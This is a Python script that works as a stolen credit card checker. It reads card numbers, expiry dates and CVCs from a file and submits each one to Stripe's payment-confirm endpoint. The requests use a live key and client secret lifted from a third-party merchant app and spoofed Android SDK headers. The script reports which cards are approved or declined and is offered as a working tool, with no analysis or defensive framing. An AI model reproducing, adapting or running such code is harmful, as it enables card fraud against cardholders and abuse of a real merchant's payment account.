import requests
import time


with open("cc.txt", "r") as f:
    combos = f.readlines()


for combo in combos:
    try:
        
        card_number, exp_month, exp_year, cvc = combo.strip().split("|")

        
        url = "https://api.stripe.com/v1/payment_intents/pi_3QEZ6NKy4g70EQF20xArS45B/confirm"
        headers = {
            "Accept": "application/json",
            "Stripe-Version": "2020-03-02",
            "Authorization": "Bearer pk_live_51P7ECHKy4g70EQF2W1AZojRQgd6bTPjxc9QHVEMBuGWxv9bYGMSJscLOazKFHn5zuFxGxUtO8az95L1jRAB3Bbaj002c2pGgAJ",
            "X-Stripe-Client-User-Agent": '{"os.name":"android","os.version":"30","bindings.version":"20.48.2","lang":"Java","publisher":"Stripe","http.agent":"Dalvik/2.1.0 (Linux; U; Android 11; M2101K7BG Build/RP1A.200720.011)"}',
            "Accept-Language": "tr-TR",
            "User-Agent": "Stripe/v1 AndroidBindings/20.48.2",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        }

        
        data = {
            "expand[]": "payment_method",
            "payment_method_data[muid]": "d2499f51-96ba-4477-a4fd-bccfd045ebf85785f6",
            "payment_method_data[billing_details][address][country]": "TR",
            "payment_method_data[payment_user_agent]": "stripe-android/20.48.2;PaymentSheet",
            "payment_method_data[guid]": "5d5f8603-9ee2-44d6-b4c6-bf41184d269dce792c",
            "payment_method_data[type]": "card",
            "payment_method_data[card][number]": card_number,
            "payment_method_data[card][cvc]": cvc,
            "payment_method_data[card][exp_month]": exp_month,
            "payment_method_data[card][exp_year]": exp_year,
            "payment_method_data[sid]": "7d3a1bd9-fc46-413a-a237-825d2bc641006c56f7",
            "return_url": "stripesdk://payment_return_url/com.solidict.catalog4p",
            "client_secret": "pi_3QEZ6NKy4g70EQF20xArS45B_secret_RKRA6olMFWRE1cHg1xXibf3du",
            "payment_method_options[card][setup_future_usage]": "",
            "use_stripe_sdk": "true",
        }

       
        response = requests.post(url, headers=headers, data=data)

        
        if response.status_code == 200:
            print(f" {card_number}:{exp_month} | {exp_year} {cvc} 1$ [ 34.88₺ ] Odeme Onaylandı ✅")
            print(response.json())
            
        else:
            print(f"{card_number}:{exp_month} | {exp_year} {cvc} 1$ [ 34.88₺ ]  Declined ❌")
            print(response.json())

    
        time.sleep(10)

    except Exception as e:
        print(f"fruad ")
        
        # @t5omas 